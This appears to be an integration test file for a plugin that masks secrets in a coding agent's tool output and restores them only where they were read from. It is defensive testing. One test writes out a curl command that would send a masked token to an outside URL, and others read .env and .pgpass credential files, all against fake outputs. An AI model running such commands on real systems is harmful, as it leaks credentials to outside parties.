// Integration tests through the engine: the test's own tool.call hooks stand for the
// tools (they answer with a fake output), the mod's hooks sit above them.
import { expect, test } from 'claude-code/testing'
import { findSecretFiles, isIgnored, parseGitignore } from '../hooks/register'

const ALNUM = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
const rnd = (n: number) => Array.from({ length: n }, () => ALNUM[Math.floor(Math.random() * ALNUM.length)]).join('')
const ghToken = () => 'gh' + 'p_' + rnd(36)
const PH = /\[REDACTED:[0-9a-f]{8}\]/
const bashOut = (stdout: string) => ({ result: { stdout, stderr: '', interrupted: false, isImage: false } }) as never
const readOut = (filePath: string, content: string) => ({ result: { type: 'text', file: { filePath, content, numLines: 1, startLine: 1, totalLines: 1 } } }) as never
const textOf = (r: { result?: unknown; text?: string; deny?: string }) => r.deny ?? r.text ?? JSON.stringify(r.result)

test('Bash output is masked before the model reads it', async ($, on) => {
  const secret = ghToken()
  on('tool.call', { tool: 'Bash' }, () => bashOut(`token: ${secret}\nok`))
  const r = await $.tool.call({ tool: 'Bash', command: 'cat config.txt' })
  expect(textOf(r).includes(secret)).toBe(false)
  expect(textOf(r)).toMatch(PH)
  expect((r.context ?? []).join(' ')).toMatch(/secret-filter masked/)
})

test('a clean output passes through untouched', async ($, on) => {
  on('tool.call', { tool: 'Bash' }, () => bashOut('hello world'))
  const r = await $.tool.call({ tool: 'Bash', command: 'echo hello world' })
  expect(textOf(r)).toMatch(/hello world/)
  expect(r.context ?? []).toEqual([])
})

test('a failed command (non-zero exit) is masked too', async ($, on) => {
  const secret = ghToken()
  on('tool.call', { tool: 'Bash' }, () => ({ isError: true, result: `Exit code 3\n${secret}`, text: `Exit code 3\n${secret}` }) as never)
  const r = await $.tool.call({ tool: 'Bash', command: 'false' })
  expect(textOf(r).includes(secret)).toBe(false)
  expect(textOf(r)).toMatch(PH)
})

test('an image the Read tool returns is left byte-for-byte alone', async ($, on) => {
  // random base64, as an image payload: full of entropy-layer and gitleaks look-alikes
  const B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  const base64 = Array.from({ length: 8192 }, () => B64[Math.floor(Math.random() * 64)]).join('')
  const image = { type: 'image', file: { base64, type: 'image/png', originalSize: 6144 } }
  on('tool.call', { tool: 'Read' }, () => ({ result: image }) as never)
  const r = await $.tool.call({ tool: 'Read', file_path: '/app/docs/diagram.png' })
  expect(JSON.stringify(r.result)).toBe(JSON.stringify(image))
  expect(r.context ?? []).toEqual([])
})

test('an MCP image block is left alone, its text block is still masked', async ($, on) => {
  const secret = ghToken()
  const data = rnd(4096)
  on('tool.call', { tool: 'mcp__shots__capture' as never }, () => ({
    result: [{ type: 'image', data, mimeType: 'image/png' }, { type: 'text', text: `token ${secret}` }],
  }) as never)
  const r = await $.tool.call({ tool: 'mcp__shots__capture' } as never)
  const out = JSON.stringify(r.result)
  expect(out.includes(data)).toBe(true)
  expect(out.includes(secret)).toBe(false)
})

test('reading a .env file masks every value', async ($, on) => {
  on('tool.call', { tool: 'Read' }, () => ({
    result: { type: 'text', file: { filePath: '/app/.env', content: 'NODE_ENV=dev\nDB_HOST=db.internal.example\nPORT=5432', numLines: 3, startLine: 1, totalLines: 3 } },
  }) as never)
  const r = await $.tool.call({ tool: 'Read', file_path: '/app/.env' })
  const t = textOf(r)
  expect(t.includes('db.internal.example')).toBe(false)
  expect(t).toMatch(/NODE_ENV=dev/)
  expect(t).toMatch(/PORT=5432/)
})

test('Edit gets the real value back for a placeholder the model copied', async ($, on) => {
  const secret = ghToken()
  let written = ''
  // every hook beneath the plugin is registered before the first $ call
  on('tool.call', { tool: 'Read' }, () => readOut('/app/settings.ini', `TOKEN=${secret}`))
  on('tool.call', { tool: 'Edit' }, (_$, e) => {
    written = e.new_string
    return { result: { filePath: e.file_path, oldString: e.old_string, newString: e.new_string, originalFile: '', structuredPatch: [], userModified: false, replaceAll: false } } as never
  })
  const read = await $.tool.call({ tool: 'Read', file_path: '/app/settings.ini' })
  const placeholder = PH.exec(textOf(read))?.[0]
  expect(placeholder).toBeDefined()

  const edit = await $.tool.call({ tool: 'Edit', file_path: '/app/settings.ini', old_string: 'TOKEN=x', new_string: `TOKEN=${placeholder}` })
  expect(written).toBe(`TOKEN=${secret}`)
  // and what comes back to the model is masked again
  expect(textOf(edit).includes(secret)).toBe(false)
})

test('a failed Edit that echoes its input does not leak the restored value', async ($, on) => {
  const secret = ghToken()
  on('tool.call', { tool: 'Read' }, () => readOut('/app/settings.ini', `TOKEN=${secret}`))
  on('tool.call', { tool: 'Edit' }, (_$, e) => {
    const msg = `String to replace not found in file.\nString: ${e.old_string}`
    return { isError: true, result: msg, text: msg } as never
  })
  const read = await $.tool.call({ tool: 'Read', file_path: '/app/settings.ini' })
  const placeholder = PH.exec(textOf(read))?.[0]
  const edit = await $.tool.call({ tool: 'Edit', file_path: '/app/settings.ini', old_string: `TOKEN=${placeholder}`, new_string: 'TOKEN=x' })
  expect(textOf(edit).includes(secret)).toBe(false)
  expect(textOf(edit)).toMatch(/not found/)
})

test('an unknown placeholder in Edit is refused, nothing is written', async ($, on) => {
  let called = false
  on('tool.call', { tool: 'Edit' }, () => {
    called = true
    return { result: {} } as never
  })
  const r = await $.tool.call({ tool: 'Edit', file_path: '/app/a.txt', old_string: 'a', new_string: 'x ' + '[REDACTED' + ':deadbeef]' })
  expect(called).toBe(false)
  expect(textOf(r)).toMatch(/placeholder/)
})

test('a Bash command holding a placeholder is refused', async ($, on) => {
  let called = false
  on('tool.call', { tool: 'Bash' }, () => {
    called = true
    return bashOut('')
  })
  const r = await $.tool.call({ tool: 'Bash', command: "sed -i 's/x/" + '[REDACTED' + ":0a1b2c3d]/' f" })
  expect(called).toBe(false)
  expect(textOf(r)).toMatch(/placeholder/)
})

// --- security: a masked value never leaves through the mod ----------------------
const B32 = 'abcdefghijklmnopqrstuvwxyz'
const lower = (n: number) => Array.from({ length: n }, () => B32[Math.floor(Math.random() * 26)]).join('')
const writeOk = (e: { file_path: string; content?: string }) => ({ result: { type: 'create', filePath: e.file_path, content: e.content ?? '', structuredPatch: [] } }) as never

test('a placeholder is not restored into another file (a script, a URL)', async ($, on) => {
  const secret = ghToken()
  let written: string | undefined
  on('tool.call', { tool: 'Read' }, () => readOut('/app/settings.ini', `TOKEN=${secret}`))
  on('tool.call', { tool: 'Write' }, (_$, e) => ((written = e.content), writeOk(e)))
  const ph = PH.exec(textOf(await $.tool.call({ tool: 'Read', file_path: '/app/settings.ini' })))![0]
  const w = await $.tool.call({ tool: 'Write', file_path: '/tmp/x/run.sh', content: `curl https://example.com/?d=${ph}` })
  expect(written).toBeUndefined()
  expect(textOf(w)).toMatch(/not read from/)
})

test('a placeholder from command output is restored nowhere', async ($, on) => {
  const secret = ghToken()
  let written: string | undefined
  on('tool.call', { tool: 'Bash' }, () => bashOut(`TOKEN=${secret}`))
  on('tool.call', { tool: 'Edit' }, (_$, e) => ((written = e.new_string), { result: {} }) as never)
  const ph = PH.exec(textOf(await $.tool.call({ tool: 'Bash', command: 'cat settings.ini run.sh' })))![0]
  await $.tool.call({ tool: 'Edit', file_path: '/app/run.sh', old_string: 'x', new_string: ph })
  expect(written).toBeUndefined()
})

test('nothing is restored under .git/', async ($, on) => {
  const secret = ghToken()
  let written: string | undefined
  on('tool.call', { tool: 'Read' }, () => readOut('/app/.git/config', `token = ${secret}`))
  on('tool.call', { tool: 'Edit' }, (_$, e) => ((written = e.new_string), { result: {} }) as never)
  const ph = PH.exec(textOf(await $.tool.call({ tool: 'Read', file_path: '/app/.git/config' })))![0]
  await $.tool.call({ tool: 'Edit', file_path: '/app/.git/config', old_string: 'x', new_string: ph })
  expect(written).toBeUndefined()
})

test('a restored value is masked when read back, even one no layer would catch', async ($, on) => {
  const secret = lower(22) // letters only: not distinctive, the field layer alone caught it
  let disk = `{"dbPassword": "${secret}"}`
  on('tool.call', { tool: 'Read' }, () => readOut('/app/config.json', disk))
  on('tool.call', { tool: 'Write' }, (_$, e) => ((disk = e.content), writeOk(e)))
  on('tool.call', { tool: 'Bash' }, () => bashOut(`note ${disk}`))
  const ph = PH.exec(textOf(await $.tool.call({ tool: 'Read', file_path: '/app/config.json' })))![0]
  const w = await $.tool.call({ tool: 'Write', file_path: '/app/config.json', content: `note ${ph}` })
  expect(disk.includes(secret)).toBe(true)
  expect(textOf(w).includes(secret)).toBe(false)
  expect(textOf(await $.tool.call({ tool: 'Bash', command: 'cat /app/config.json | head' })).includes(secret)).toBe(false)
})

test('a deny from beneath that quotes the restored input is masked', async ($, on) => {
  const secret = ghToken()
  on('tool.call', { tool: 'Read' }, () => readOut('/app/a.txt', `TOKEN=${secret}`))
  on('tool.call', { tool: 'Write' }, (_$, e) => ({ deny: `blocked by another scanner: found ${e.content}` }) as never)
  const ph = PH.exec(textOf(await $.tool.call({ tool: 'Read', file_path: '/app/a.txt' })))![0]
  const w = await $.tool.call({ tool: 'Write', file_path: '/app/a.txt', content: `T=${ph}` })
  expect(textOf(w).includes(secret)).toBe(false)
})

test('cat .env (a bare file name) turns env mode on', async ($, on) => {
  const pw = lower(20)
  on('tool.call', { tool: 'Bash' }, (_$, e) => bashOut(e.command.includes('pgpass') ? `localhost:5432:app:appuser:${pw}` : `DB_HOST=db.internal.example\nSESSION_KEY=${pw}`))
  const env = textOf(await $.tool.call({ tool: 'Bash', command: 'cat .env' }))
  expect(env.includes('db.internal.example') || env.includes(pw)).toBe(false)
  expect(textOf(await $.tool.call({ tool: 'Bash', command: 'cat .pgpass' })).includes(pw)).toBe(false)
})

test('MCP text that claims a binary type is still masked; real images are not', async ($, on) => {
  const secret = ghToken()
  const shapes: Record<string, unknown> = {
    octet: [{ type: 'resource', resource: { uri: 'file:///app/.env', mimeType: 'application/octet-stream', text: `TOKEN=${secret}` } }],
    vnd: [{ type: 'text', mimeType: 'application/vnd.api+json', text: `{"t":"${secret}"}` }],
    data: { data: JSON.stringify({ items: Array(20).fill('padding-value'), token: secret }) },
    blob: [{ type: 'resource', resource: { uri: 'file:///app/x', mimeType: 'application/octet-stream', blob: btoa(`${'#'.repeat(300)}\nTOKEN=${secret}\n`) } }],
  }
  on('tool.call', { tool: 'mcp__fs__read' as never }, (_$, e) => ({ result: shapes[(e as unknown as { shape: string }).shape] }) as never)
  for (const shape of Object.keys(shapes)) {
    const out = textOf(await $.tool.call({ tool: 'mcp__fs__read', shape } as never))
    expect(out.includes(secret)).toBe(false)
    if (shape === 'blob') expect(atob(JSON.parse(out)[0].resource.blob).includes(secret)).toBe(false)
  }
})

test('ReadMcpResourceTool output is masked', async ($, on) => {
  const secret = ghToken()
  on('tool.call', { tool: 'ReadMcpResourceTool' as never }, () => ({ result: { contents: [{ uri: 'x', text: `TOKEN=${secret}` }] } }) as never)
  const r = await $.tool.call({ tool: 'ReadMcpResourceTool', server: 's', uri: 'x' } as never)
  expect(textOf(r).includes(secret)).toBe(false)
})

test('rows the conversation keeps (notifications, other tools) are masked', async ($, on) => {
  const secret = ghToken()
  const r = await $.session.append({ message: { type: 'user', content: [{ type: 'text', text: `event: TOKEN=${secret}` }] } } as never)
  const out = JSON.stringify(r)
  expect(out.includes(secret)).toBe(false)
  expect(out).toMatch(PH)
})

// --- seeding --------------------------------------------------------------------
test('seeding reads only secret files git ignores, nearest first', async () => {
  const tree: Record<string, { name: string; kind: string; size: number }[]> = {
    '/p': [{ name: '.git', kind: 'dir', size: 0 }, { name: '.gitignore', kind: 'file', size: 10 }, { name: '.env', kind: 'file', size: 10 },
      { name: 'fixtures', kind: 'dir', size: 0 }, { name: 'api', kind: 'dir', size: 0 }],
    '/p/fixtures': [{ name: '.env', kind: 'file', size: 10 }],
    '/p/api': [{ name: '.env.local', kind: 'file', size: 10 }],
  }
  const files: Record<string, string> = { '/p/.gitignore': '.env\n.env.*\n!fixtures/.env\n' }
  const found = await findSecretFiles(async d => tree[d] ?? [], async f => files[f] ?? '', '/p')
  expect(found).toEqual(['/p/.env', '/p/api/.env.local'])
})

test('outside a git repository every secret file is seeded', async () => {
  const tree: Record<string, { name: string; kind: string; size: number }[]> = { '/p': [{ name: '.env', kind: 'file', size: 10 }] }
  expect(await findSecretFiles(async d => tree[d] ?? [], async () => '', '/p')).toEqual(['/p/.env'])
})

test('gitignore matching: anchored, nested, directories, negation', () => {
  const rules = parseGitignore('/secrets/\n*.local\n**/conf/.env\n!keep.local\n', '/r')
  expect(isIgnored(rules, '/r/secrets/.env')).toBe(true)
  expect(isIgnored(rules, '/r/a/secrets/.env')).toBe(false)
  expect(isIgnored(rules, '/r/a/b/x.local')).toBe(true)
  expect(isIgnored(rules, '/r/keep.local')).toBe(false)
  expect(isIgnored(rules, '/r/x/conf/.env')).toBe(true)
  expect(isIgnored(rules, '/r/.env')).toBe(false)
})
